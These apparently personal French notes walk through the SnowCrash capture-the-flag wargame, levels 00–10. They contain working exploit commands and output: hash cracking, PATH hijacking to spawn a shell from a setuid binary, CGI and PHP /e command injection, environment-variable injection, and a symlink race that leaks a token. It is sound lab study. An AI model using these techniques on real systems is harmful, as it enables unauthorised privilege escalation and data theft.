LEVEL 00 : 

- ls : rien

- ls -a : trois fichier mais rien de comprehensible dedans

- ../../../ racine : Pleins de dossier.

- grep -r "mot cle" : password, passwd, mdp, token, user : rien de concluant.

- Balade dans les fichiers interressant a premiere vue.
    usr/sbin : john ??
        cat john : cdiiddwpgswtgt
                    Message coder ?
        grep -r "john"
            deuxieme john identique dans rofs
            plein d'addresse github 
            Idee : faire une rotation code romain sur internet
                rot15 : nottoohardhere
            su flag00 : nottoohardhere
            getglag : x24ti5gi3x0ol2eh4esiuxias

-------------------------------------------------------------------------------------------------------------------------------

LEVEL 01:

- ls : rien

- ls -a : trois fichier mais rien de comprehensible dedans

- Retour a la racine ~ ../../..

- Balade dans les fichier : 
                            john est toujours la avec son charabia
                            decouverte dans /etc : fichier passwd et gpasswd
                            cat passwd :  flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bashrm -rf
                            flag01 : 42hDRfypTqqnw n'est pas le mdp.
42hDRfypTqqnw ressemble a un mdp hasher, est ce que j'en ai besoin pour avoir acces a un user avec plus de droit ?

-Rien trouve d'autre dans les fichiers avec : find / -user flag01 -perm -4000 2>/dev/null

-Recherche d'acces a home : denied.

-Tentative de copie de /home/flag/flag01: dans un fichier texte de /tmp (seul endroit ou j'ai visiblement des droits)
    : denied. Toujours pas d'acces a home meme en copie.

-Recherche sur internet de logiciel de decryptage -> Rien de concluant, pas de match.

-John the reaper est un logiciel de decryptage !
    Pas installer sur ma VM, je tente de l'installer :
    Lociel payant, mais trouver gratuitement sur github.
    Git clone ne fonctionne pas, je n'ai pas git d'installer sur ma VM.
    Je ne peux pas l'installer, j'ai besoin du mdp de flag01.
    Je sors de ma VM et installe John sur ma machine.
        gcl https://github.com/openwall/john.git John
        cd John
        cd src

        ./configure --disable-openmp &&
        make -s clean && make -sj4 && mv ../run/john ../run/john-non-omp &&
        ./configure CPPFLAGS='-DOMP_FALLBACK -DOMP_FALLBACK_BINARY="\"john-non-omp\""' &&
        make -s clean && make -sj4 && echo All Done

        cd ../run
        echo 'flag01:42hDRfypTqqnw' > hash.txt
        ./john --format=crypt hash.txt
            -> abcdefg          (flag01)

        su flag01 : abcdefg
        getflag : f2av5il02puano7naaf6adaaf

--------------------------------------------------------------------------------------------------------------------------------------------

LEVEL 02: 

- ls : level02.pcap

- cat level02.pcap : charabia mais dans le fichier il y a des mots interressant:

                #SodaCan:0����'DISPLAYSodaCan:0����xterm��@f&N0�TT$EFԧ@@~;���;���/Y�O���o�����9

                Linux 2.6.38-8-generic-pae (::ffff:10.1.1.2) (pts/10)
                wwwbugs login: @f&NV.B'̊$E4��@@J<;���;��ߙO/Y�t���

                Password: Nf&NatB'̊$E4��@@J-;���;��ߙO/Y����%�s��

                Login incorrect
                wwwbugs login: df&N�%

- Recherche de ce qu'est un .pcap : 
        Un .pcap (Packet CAPture) est un fichier qui contient un enregistrement brut de trafic réseau, capturé sur une interface à un moment donné.
        Contient:
                  Chaque paquet réseau, dans l’ordre où il a été intercepté.
                  Les en-têtes des protocoles (Ethernet, IP, TCP, UDP, HTTP, etc.).
                  Éventuellement la donnée brute transmise (payload).
                  Des horodatages précis (heure exacte de la capture).
                  Des métadonnées liées à l’interface de capture.

- Tentative de decryptage : tcpdump -r level02.pcap -> plein d'info brut, rien de precis

- Lecture des paquet : strings level02.pcap -> bingo

                SodaCan:0
                DISPLAY
                SodaCan:0

                Linux 2.6.38-8-generic-pae (::ffff:10.1.1.2) (pts/10)
                wwwbugs login: @f&NV.

                Password: Nf&Nat

                Login incorrect
                wwwbugs login: df&N

- Su flag 02: Nf&Nat : Authentication failure -? je pense que c'est encoder, comme le login

-J'ai taper Nf&Nat sur internet, j'ai trouver que dans Linux, nf_nat est un module du noyau (kernel) pour la traduction d’adresses réseau (NAT – Network Address Translation).
        Il gère comment les paquets IP sont modifiés pour passer d’un réseau à un autre. -> 10.1.1.2 ?

- Su flag 02: SodaCan -> non, piege ?

-Recherche sur les paquets et leurs lecture -> Wireshark est un analyseur de paquet gratuit.

-Recuperation de level02.pcap hors de ma vm : 
                                              cp /home/user/level02/level02.pcap /tmp/  -> copie le fichier dans mon tmp
                                              chmod 644 /tmp/level02.pcap -> rend le fichier copiable par n’importe qui sans donner plus de droits que nécessaire.

                                              scp -P 4243 level01@127.0.0.1:/tmp/level02.pcap .  -> Dans ma machine pour recuperer level02.pcap

- Lecture dans Wireshark : Rien de visible a premiere vue ?

- Le mot password apparait -> Toute ligne d'apres font 1 byte, abant non, si je met tout les caractere a la suite : f t _ w a n d r . . . N D R e l . L 0 L

- ft_wandr...DRel.L0L -> pas le mot de passe, mais suspect, il doit y avoir des lettres en trop ? 

- Les '.' ne sont pas des points, ligne fini par '7f' -> man ascii -> 127 -> DEL : a supprimer ?

- ft_wandrDRelL0L -> pas le mot de passe, autre chose a enlever ? 

- Apres le 'L0L' il y a 0d -> 13 -> /r -> retour chariot, white space a supprimer aussi, fin de mdp ? 

- f t _ w a n d r 127 127 127 N D R e l 127 L 0 L 13  = ft_wandrNDRelL0L -> pas le mot de passe, les DEL veulent surement dire de supprimer avant ou apres, ndr / NDR est en double

- ft_wandrel0L -> non  

    su flag : ft_waNDReL0L

    getflag : kooda2puivaav1idi4f57q8iq

---------------------------------------------------------------------------------------------------------------------------------

LEVEL03

- ls -l : total 12     -rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03  -> s à la place du x pour user et pour group -> le programme s’exécute avec les droits du propriétaire ou du groupe (flag03)

- cat level03 : charabia mais dans le fichier il y a un truc interressant:

                            /usr/bin/env echo Exploit me

env sert à exécuter un programme en utilisant la variable d’environnement $PATH pour savoir où le trouver.

Il va chercher echo dans l’ordre des dossiers listés dans $PATH.

Si on met un faux echo dans un dossier qui apparaît en premier dans $PATH, c’est ce faux programme qui sera exécuté à la place du vrai /bin/echo.

    On place notre propre script nommé echo dans un dossier qui apparaît avant /bin dans $PATH, c’est notre script qui sera exécuté, pas le vrai /bin/echo
    On crée un faux echo qui exécute /bin/sh (ou /bin/bash) pour ouvrir un shell.
    On donne les permissions d’exécution (chmod +x).

        echo '/bin/sh' > /tmp/echo
        chmod +x /tmp/echo


    On met son dossier (/tmp) en tête du $PATH (export PATH=/tmp:$PATH).

        export PATH=/tmp:$PATH

    Quand le programme appelle env echo, il tombe sur notre script et nous donne un shell avec les droits du programme (flag03).

-cd ~  -> ./level03

- getflag dans le shell : qi0maab88jeaj46qoumi7maus

- exit ->  su level04 : qi0maab88jeaj46qoumi7maus
-----------------------------------------------------------------------------------------------------------------------

LEVEL04

- ls -l total 4  -rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl

-Recherche .pl ->  Perl Language
    Langage de programmation créé dans les années 80, très utilisé pour le traitement de texte, les scripts systèmes, l’administration réseau, etc.
    Les fichiers .pl sont du texte contenant du code, et ils s’exécutent avec l’interpréteur "perl ./exectuable"

- perl ./level04  : Content-type: text/html

- cat level04 : 
                #!/usr/bin/perl
                # localhost:4747
                use CGI qw{param};
                print "Content-type: text/html\n\n";
                sub x {
                $y = $_[0];
                print `echo $y 2>&1`;
                }
                x(param("x"));



- Decomposons ce code : 

                 #!/usr/bin/perl  -> le script doit être exécuté avec l’interpréteur Perl

                # localhost:4747 -> peut-être où le serveur CGI écoute

                use CGI qw{param}; -> Charge le module CGI pour récupérer les paramètres passés via l’URL ou un formulaire

                print "Content-type: text/html\n\n"; -> En-tête HTTP obligatoire pour un script CGI, indique que la sortie sera du HTML

                sub x {               |        Définit une fonction x qui :
                $y = $_[0];           |  ->    récupère son argument dans $y ($_[0])
                print `echo $y 2>&1`; |        exécute la commande shell echo $y et affiche le résultat dans la page web
                }                     |           (2>&1 redirige aussi les erreurs)

                x(param("x")); ->  Appelle la fonction x avec le paramètre x passé dans l’URL ou le formulaire.


- Idee : visiblement il n’y a aucune validation de l’entrée ? 

                $x = param("x");    -> Récupère le paramètre x de l'URL
                print `echo $x 2>&1`;  -> Exécute $x dans un backtick (commande shell)

        Donc tout ce qui est passé dans x est exécuté par le shell sans aucune validation. 

- Test : Le script Perl est un serveur web CGI, donc il s’attend à recevoir la requête via HTTP

                curl "http://localhost:4747/?x=;cat%20/home/flag/flag04"   
                echo ;home/flag/flag04 2>&1

                -> Permission denied

- J'ai mal ecrit : pour injecter en html 'space' -> %20 et ' -> %60

        curl "http://localhost:4747/?x=%60ls%20-l%20/home/flag/flag04%60"    (ls -l /home/flag/flag04)
        -> total 4 -r-x------ 1 flag04 flag04 33 Aug 30 2015 README.txt

J'ai un readme dans flag04 : 

        curl "http://localhost:4747/?x=%60cat%20/home/flag/flag04/README.txt%60"
        -> Don't forget to launch getflag !
-  getflag :
Check flag.Here is your token : 
Nope there is no token here for you sorry. Try again

- Le readme contient "Don't forget to launch getflag !" -> j'ai juste lu dedand, je n'ai toujours pas les autorisations

- Je passe encore par curl pour essayer d'executer getflag directement: 

            curl "http://localhost:4747/?x=%60getflag%60"  (./getflag)
            -> Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap

Donc $y contient `getflag`.

Les backticks (')autour de $y font exécuter getflag.

echo $y affiche la sortie de getflag.

2>&1 redirige les erreurs vers la sortie standard pour que tout soit imprimé.


- su level05 : ne2searoevaevoem4ov4ar8ap

--------------------------------------------------------------------------------


LEVEL05

- ls -l : vide

-Balade dans les dossiers racine :
    bin : rien de bizarre
    etc : rien de bizarre
    sbin : peut etre mount.ecryptfs_private ?
    usr/sbin : ls -l : -rwxr-x---+ 1 flag05  flag05      94 Mar  5  2016 openarenaserver

- cat openarenaserver :

        #!/bin/sh

        for i in /opt/openarenaserver/* ; do
            (ulimit -t 5; bash -x "$i")
            rm -f "$i"
        done

- Dcomposons ce code : 

        #!/bin/sh  -> shebang : script executer en sh

        for i in /opt/openarenaserver/* ; do       -> Boucle sur tous les fichiers du dossier /opt/openarenaserver/ et stocke chaque chemin dans la variable $i.
            (ulimit -t 5; bash -x "$i")         |  -> Exécute chaque fichier dans un sous-shell.
                                                        ulimit -t 5 limite le temps CPU à 5 secondes pour éviter des scripts qui tournent trop longtemps.
                                                        bash -x "$i" lance le script $i en mode debug, donc chaque commande exécutée sera affichée.
            rm -f "$i"                             -> Supprime le fichier après l’exécution.
        done                                       -> Ferme la boucle for


- cd opt/openarenaserver : ls -l total 0

- Open a rena server ? -> Rena ?
    Non, Arena server : un programme qui gère un service multi-utilisateur, souvent pour des jeux ou des simulations compétitives
                        Dans un jeu en ligne, le arena server serait le programme qui gère les combats entre joueurs, l’état du terrain, les scores, etc.
                        Les joueurs (clients) ne font qu’envoyer des commandes et recevoir des informations

- Idee : faire un fichier qui exectute getflag et renvoie sont print : le token.
        
        touch test.sh ->ok
        vim test.sh 
        cat test.sh 
            #!/bin/bash
            getflag
        ./test.sh
        bash: ./test.sh: Permission denied

- Besoin de plus de droit ? 
    
    chmod -x test.sh ->ok
    ./test.sh
    bash: ./test.sh: Permission denied

   -> Je n'ai pas les droit d'executer moi meme un script, je doit attendre qu'il s'execute seul via le script que j'ai trouver ?
        Donc pas besoin de chmod

    Il suffit que mon fichier soit dans /opt/openarenaserver/ au moment où le serveur tourne, et il sera exécuté par le serveur automatiquement.

- Comment declancher le script ? 
    - Idee : retourner dans usr/bin et voir si je peux lancer openarenaserver ici 

        level05@SnowCrash:/usr/sbin$ ./openarenaserver
                          bash: ./openarenaserver: Permission denied
    
    - J'essaie de me donner des droit d'execussion avec chmod dans usr/sbin:
        chmod -x openarenaserver 
        chmod: changing permissions of `openarenaserver': Operation not permitted

    -Idee : Chercher un crontab : qui permet de planifier l’exécution automatique de commandes ou scripts à intervalles réguliers

        level05@SnowCrash:/usr/sbin$ grep -r cron .
        Binary file ./apache2 matches
        Binary file ./atd matches
        Binary file ./cron matches
        ./delgroup:    if (system("crontab -l $user >/dev/null 2>&1") == 0) {
        ./delgroup:      # crontab -l returns 1 if there is no crontab
        ./delgroup:      my $crontab = &which('crontab');
        ./delgroup:      &systemcall($crontab, "-r", $user);
        ./delgroup:      s_print (gtx("Removing crontab ...\n"));
        ./deluser:    if (system("crontab -l $user >/dev/null 2>&1") == 0) {
        ./deluser:      # crontab -l returns 1 if there is no crontab
        ./deluser:      my $crontab = &which('crontab');
        ./deluser:      &systemcall($crontab, "-r", $user);
        ./deluser:      s_print (gtx("Removing crontab ...\n"));
        Binary file ./rotatelogs matches
        Binary file ./rsyslogd matches
        Binary file ./tcpdump matches

    -> Pas forcement la meilleur idee, Pour toucher un crontab je vais surement avoir besoin des droit (que je n'ai pas et ne peux pas me donner via chmod)
        Je change de piste
    
    -Realisation : En regardant mes notes au dessus, j'ai mis :  chmod -x test.sh ->ok -> Je m'eneleve le droit d'execution !

    -Je veux chmod +x test.sh dans opt/openarenaserver : chmod: cannot access `test.sh': No such file or directory
        test.sh a ete supprimer, donc il a ete executer et je ne l'ai pas vue ?
    
    - Je refais la manip touch,vim,cat,chamod + et j'attend de voir (2min, si mon flag apparait)
        test.sh a encore disparu sans rien afficher
    
    -Je rajoute un print dans mon script.

        #!/bin/bash
        echo $(getflag)

        test.sh a encore disparu sans rien afficher

    -Realisation : Mon script est exécuté dans un sous-shell ! Rien ne sors sur mon terminal, c'est normal

    -Idee : Rediriger la sortie vers un .txt dans mon /tmp

        #!/bin/bash
        getflag > /tmp/flag.txt 2>&1

        Je pourrais cat mon .txt apres que mon .sh ai disparu

    - cat /tmp/flag.txt
            Check flag.Here is your token : viuaaale9huek52boumoomioc

    -su level06 : viuaaale9huek52boumoomioc

---------------------------------------------------------------------------------------------------------------------------

LEVEL06

- ls -l : total 12
          -rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
          -rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php

- ./level06
        PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4

- cat level06.php 
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>

- Decomposons ce code :

            #!/usr/bin/php
        <?php
        function y($m) { 
            $m = preg_replace("/\./", " x ", $m);    ->  La fonction y remplace les points . par " x " et le @ par " y".
            $m = preg_replace("/@/", " y", $m);      ->  C’est une sorte de « chiffrement » très simple ou de transformation de texte.
            return $m; 
        }


        function x($y, $z) { 
            $a = file_get_contents($y);                                 -> La fonction x lit le contenu d’un fichier $y via file_get_contents.
            $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);     -> utilise le modificateur /e (exécute le code PHP généré), donc elle exécute la fonction y sur ce qu’elle capture entre [x ...].
            $a = preg_replace("/\[/", "(", $a);                        |
            $a = preg_replace("/\]/", ")", $a);                        | -> transforme les crochets en parenthèses
            return $a; 
        }

        $r = x($argv[1], $argv[2]);   -> prend les arguments passés en ligne de commande et les passe à x
        print $r;                     -> imprime le resultat
        ?>


- On peut conclure ici que : L'erreur de ./level06 apparaît parce que il a ete executer sans argument.
                             Le script PHP attend un fichier en argument pour le lire et le transformer.
                             J'ai les droit d'execution sur ./level06

- Crer un fichier .php qui execute getflag et utiliser ./level06 pour le lancer \

    -Dans /tmp : touch test.php
                vim : <?php
                        echo shell_exec('getflag');
                        ?>
     -remarque : Le script de level06.php change les des caracteres en d'autres [] -> ()

                        <?php
                        echo shell_exec('getflag');
                        ?>

    - $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); -> cherche un motif comme : [x quelque_chose]

        [x echo shell_exec('getflag');]  est traduit comme : ( echo shell_exec('getflag'); )

        -> level06@SnowCrash:~$ ./level06 /tmp/test.php ne revoie rien. 

    - Idee : ./level06 ne lit pas et n’exécute un script PHP, il lit un fichier texte et applique les remplacements, puis c’est ce texte modifié qui est affiché, pas exécuté par PHP.


        Les crochets [ et ] sont convertis en parenthèses.
        Le x final sert à marquer le code comme exécutable via la regex /e
        Les accolades sont nécessaires pour que la syntaxe PHP comprenne qu’on veut évaluer une expression complexe.
        ${…} force PHP à évaluer le résultat de system(getflag) dans un contexte de substitution.
        system(getflag) exécute la commande et renvoie son résultat.


        echo '[x {${system(getflag)}}]' > /tmp/test 
        ./level06 /tmp/test
            PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
            Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
            PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1

       -> system(getflag) imprime directement le token.
       -> print $a imprime le même contenu transformé par preg_replace → double affichage.

- su level07 : wiok45aaoguiboiki2tuin6ub

------------------------------------------------------------------------------------------------------------------------------

LEVEL07

- ls -l : -rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07

- cat level07 : mot cle : LOGNAME/bin/echo %s 0  
        usr/bin  -> premier fichier s'apelle [ et contient du charabia avec plein de %s
        rien de tres concluant

- ./level 7 renvoie level07 quoi que soit passer en argument
        arg[0] quelque part ?
        j'ai les droit d'execution sur ./level07

- env : LOGNAME=level07

- LOGNAME=test ./level07
        -> test            -> Donc LOGNAME est le arg[0] de ./level07 et il a l'air de faire un echo LOGNAME

-Test si un script dans /tmp peut lance ./level07

        level07@SnowCrash:~$ cd /tmp
        level07@SnowCrash:/tmp$ mkdir moi
        level07@SnowCrash:/tmp$ cd moi
        level07@SnowCrash:/tmp/moi$ vim getflag
        level07@SnowCrash:/tmp/moi$ cat getflag
        #!/bin/bash
        /home/flag/flag07/getflag
        level07@SnowCrash:/tmp/moi$ chmod +x getflag
        level07@SnowCrash:/tmp/moi$ cd ~
        level07@SnowCrash:~$ LOGNAME=/tmp/moi ./level07
        ->  /tmp/moi

        Donc ./level07 ne lance pas directement $LOGNAME/getflag

-Test si on ne fait pas de fichier mais ecrivons directement LOGNAME=getflag ->renvoie getflag
    avec des '' ? -> idem
    avec '``' pour comprendre que c'est un executable -> Check flag.Here is your token : fiumuikeil55xe9cu4dood66h

- su level08 : fiumuikeil55xe9cu4dood66h


------------------------------------------------------------------------------------------------------------------------

LEVEL08

- ls -l  total 16
        -rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
        -rw-------  1 flag08 flag08    26 Mar  5  2016 token


- ./level08 
    ./level08 [file to read]
 ./level08 token
    You may not access 'token'

- Il faut recuperer des droit ou contourner le probleme pour avoir acces a token
     chmod -r token
        chmod: changing permissions of `token': Operation not permitted

-On peut lire token mais pas l'utiliser 

-Idee : le copier sous un autre nom dans /tmp et le lire avec ./level08
    cd /tmp
    ln -s /home/user/level08/token leurre
    cd ~
    ./level08 /tmp/leurre
        quif5eloekouj29ke0vouxean

- su level09 : quif5eloekouj29ke0vouxean -> pas le mot de passe !

- su flag08 : quif5eloekouj29ke0vouxean -> Don't forget to launch getflag !

- getflag : 25749xKZ8L7DkSCwJkT9dyv6f

- su level09 : 25749xKZ8L7DkSCwJkT9dyv6f

-------------------------------------------------------------------------------------------------------------------

LEVEL09

- ls -l total 12
    -rwsr-sr-x 1 flag09 level09 7640 Mar  5  2016 level09
    ----r--r-- 1 flag09 level09   26 Mar  5  2016 token


-Meme principe que le precedant mais avec des droit different.

- ./level09 
    You need to provied only one arg.
  ./level09 token
    tpmhr

- cat token
    f4kmm6p|=�p�n��DB�Du{��

- tpmhr -> f4kmm6p|=�p�n��DB�Du{��

Analyse de ./level09 :
                        strings ./level09
                            putchar
                            stdout
                            fputc
                            getenv
                            stderr
                            ptrace
                            fwrite
                            open

                            PTRh
                            UWVS
                            [^_]
                            You should not reverse this
                            LD_PRELOAD
                            Injection Linked lib detected exit..
                            /etc/ld.so.preload
                            /proc/self/maps
                            /proc/self/maps is unaccessible, probably a LD_PRELOAD attempt exit..
                            libc
                            You need to provied only one arg.
                            00000000 00:00 0
                            LD_PRELOAD detected through memory maps exit ..
                            ;*2$"$


- You should not reverse this ? Cryptage, il faut trouver un patern ? (tpmhr -> f4kmm6p|=�p�n��DB�Du{��)

-Idee : chercher un paterne avec ./level09 abcd 
    ./level09 abcde
        acegi
    ./level09 00
        01
    ./level09 000000000000000000000000000000000000000000000
        0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\
    ./level09 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
        0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~�������������������������������������������������������������������������������������������
    ./level09 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
        abcdefghijklmnopqrstuvwxyz{|}~��������������������������������������

- Decale de +1 chaque caractere en suivant ascii ?

-Test : Faire un programme dans /tmp qui prendra token en argument et tout decaler de +1 a chaque char.

        #include <unistd.h>

        void ft_putchar(char c)
        { write(1, &c, 1); }

        int main(int argc, char **argv)
        { if (argc != 2) return (1);
        size_t i = 0;
        while (argv[1][i])
            ft_putchar(argv[1][i] - i++);
        ft_putchar('\n'); }


- gcc test.c
  ./a.out ~/token
    /gmja*ol]i%aYiW] (a[VOW  -> bizzare ?  flag09 ? -> non

- Je passais le chemin du fichier, donc ./a.out interprette /home/user/token, et pas son contenue

- ./a.out `cat ~/token`
    f3iji1ju5yuevaus41q1afiuq

-su levle10 : f3iji1ju5yuevaus41q1afiuq -> non

-su flag09 : f3iji1ju5yuevaus41q1afiuq
    Don't forget to launch getflag !
- getflag
    Check flag.Here is your token : s5cAJpM8ev6XHw998pRWG728z

    -su level10 : s5cAJpM8ev6XHw998pRWG728z

----------------------------------------------------------------------------------------------------------------

LEVEL10

 ls -l total 16
    -rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
    -rw-------  1 flag10 flag10     26 Mar  5  2016 token


- ./level10 
    ./level10 file host
	    sends file to host if you have access to it

 ./level10 token flag10
    You don't have access to token

-Idee : pour recupere l'acces a token, je fait un leurre dans mon /tmp 

    cd /tmp
    mkdir leurre
    ln ln -s /home/user/level10/token /tmp/leurre
    cd ~
    ./level10 /tmp/leurre flag10
        Connecting to flag10:6969 .. Unable to connect to host flag10

- J'ai bien recup token mais je n'ai pas le bon user -> essaye de se connecter à un service réseau sur flag10:6969
    Pas d'acces a 6969 -> changement de piste

- strings level10 :
                    level10.c
                    
- ../../../usr pour des recherches de login/host/user
  grep -r level10 .
    grep: ./share/doc/tasksel/changelog.gz: Too many levels of symbolic links  -> piste

    cd /share/doc/tasksel  ->  cat TODO
            Now that debconf-apt-progress is used and tasksel can run inside debconf,
            it would be nice to convert it so tasksel starts debconf and the beginning,
            and runs everything under debconf, except perhaps any manual package
            selection that the user might decide to do. This would reduce startup
            delays and also the delay between the two debconf runs it does now.

            Also, to better handle the case of one task being removed while another is
            installed, use debconf-apt-progress with waypoints.
        Meh, ca n'as pas l'aire d'etre une bonne piste, pas grand chose a voir avec ./level10 ou des hosts

- Idee : reussir a executer getflag sans dependre du reseau ? (6969) 
    - Verifier comment lon leurre est lu avec strace (trace les appels système d’un programme, toutes les interactions qu’un programme a avec le noyau Linux : lecture/écriture de fichiers, ouverture de fichiers, création de processus, allocation de mémoire, communication réseau, etc.)
        strace ./level10 /tmp/leurre/token 2>&1 | grep open
            open("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
            open("/lib/i386-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3

            ->ouvre uniquement des fichiers système et pas token

-Idee : sortir de la vm pour pouvoir atteindre le serveur flag10:6969 
    netcat ?


    On doit faire un petit server nous meme ? 
        ./level10 /tmp/leurre 0.0.0.0
            Connecting to 0.0.0.0:6969 .. Unable to connect to host 0.0.0.0
        ./level10 /tmp/leurre 127.0.0.1
            Connecting to 127.0.0.1:6969 .. Unable to connect to host 127.0.0.1
        ./level10 /tmp/leurre 10.0.2.15
            Connecting to 10.0.2.15:6969 .. Unable to connect to host 10.0.2.15

    -> on dois faire notre petit serveur nous meme ? 


    cd /tmp 
    vim server.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>

#define PORT 6969
#define BUFFER_SIZE 1024

int main() {
    int server_fd, new_socket;
    struct sockaddr_in address;
    socklen_t addrlen = sizeof(address);
    char buffer[BUFFER_SIZE];
    int bytes_read;

    // Création du socket
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("socket failed");
        exit(EXIT_FAILURE);
    }

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    // Bind
    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
        perror("bind failed");
        exit(EXIT_FAILURE);
    }

    // Écoute
    if (listen(server_fd, 1) < 0) {
        perror("listen failed");
        exit(EXIT_FAILURE);
    }

    printf("Server listening on port %d...\n", PORT);

    while (1) {
        if ((new_socket = accept(server_fd, (struct sockaddr *)&address, &addrlen)) < 0) {
            perror("accept failed");
            continue;
        }

        printf("Connected by %s:%d\n", inet_ntoa(address.sin_addr), ntohs(address.sin_port));

        // Lire tout le flux et l’afficher directement
        while ((bytes_read = read(new_socket, buffer, BUFFER_SIZE)) > 0) {
            fwrite(buffer, 1, bytes_read, stdout); // Affiche tous les octets, y compris les \0
            fflush(stdout);
        }

        close(new_socket);
        printf("\nConnection closed.\n");
    }

    close(server_fd);
    return 0;
}


        gcc /tmp/server.c -o server
        ./server
            Server listening on port 6969...


    -Dans un autre onglet :    connexion ssh et go level10

                    ./level10 /tmp/leurre 127.0.0.1
                        Connecting to 127.0.0.1:6969 .. Connected!
                        Sending file .. Unable to read from file: Is a directory

    -Mon server renvoie :    
                            Connected by 127.0.0.1:37872
                            .*( )*.
                            Connection closed.


echo > /tmp/hak && while :; do ln -fs /tmp/hak /tmp/fuk; ln -fs ~/token /tmp/fuk; done

./level10 /tmp/fuk 127.0.0.1
Connecting to 127.0.0.1:6969 .. Connected!
Sending file .. wrote file!

Connected by 127.0.0.1:37922
.*( )*.
woupa2yuojeeaaed06riuj63c

Connection closed.


su flag10
Password: 
Don't forget to launch getflag !
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c